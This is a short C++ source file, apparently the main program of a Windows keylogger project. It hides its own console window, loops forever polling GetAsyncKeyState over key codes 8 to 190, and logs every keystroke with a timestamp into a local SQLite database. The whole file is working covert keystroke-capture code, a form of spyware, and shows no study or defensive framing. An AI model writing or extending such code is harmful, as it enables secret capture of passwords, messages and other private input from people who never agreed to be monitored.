#include "database.h"
#include "keylogger.h"

#include <ctime>
#include <iostream>

int main(int argc, char** argv) {
	
	Database db("keyboardTigran.sqlite3");
	std::string cols[2] = { "time, key" };
	db.createTable("keyboard", 2, cols);

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY = 'x';

    while (true) {
        Sleep(10);
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767) 
            {
                if (SpecialKeys(KEY) == false) 
                {
                    std::time_t time = std::time(0);
                    db.insertKey("keyboard", time, KEY);
                }
            }

        }
    }

	return 0;
}